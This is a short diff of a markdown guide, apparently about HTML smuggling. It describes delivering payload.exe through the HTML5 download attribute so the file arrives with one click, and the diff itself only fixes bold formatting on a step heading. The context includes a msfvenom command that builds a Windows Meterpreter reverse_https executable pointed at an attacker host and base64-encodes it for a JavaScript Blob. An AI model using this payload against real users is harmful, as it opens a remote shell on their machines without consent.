@@ -18,7 +18,7 @@ the download attribute of the achor tag of HTML5, which is loaded in the browser
 
 the payload.exe file will be downloaded automatically once the user clicks on the link. there is no interaction.
 
-**1 - create a Base64 Meterpreter executable and store it as a Blob inside a JavaScript variable.
+**1 - create a Base64 Meterpreter executable and store it as a Blob inside a JavaScript variable.**
 ```sh
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.45 LPORT=443 -f exe > mstager.exe && base64 mstager.exe > stager.b64
 ```
